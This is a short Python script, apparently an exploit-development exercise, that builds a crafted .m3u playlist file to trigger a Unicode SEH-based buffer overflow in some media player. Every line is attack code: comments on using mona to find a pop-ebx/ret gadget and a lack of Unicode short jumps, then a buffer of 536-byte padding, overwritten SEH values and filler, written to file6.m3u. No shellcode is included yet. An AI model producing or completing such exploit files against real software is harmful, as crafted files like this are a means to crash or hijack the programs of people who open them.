#mona seh -cp unicode
# pop ebx # ret 0x04 | 0x004100f2
#no short jump unicode, so instrutions that won't truncate buffer "\x41\x71"
buffer = "A"*536 + "\x71\x41" +"\xf2\x41" + "X" * 2864
f = open('file6.m3u','w')
f.write(buffer)
f.close()
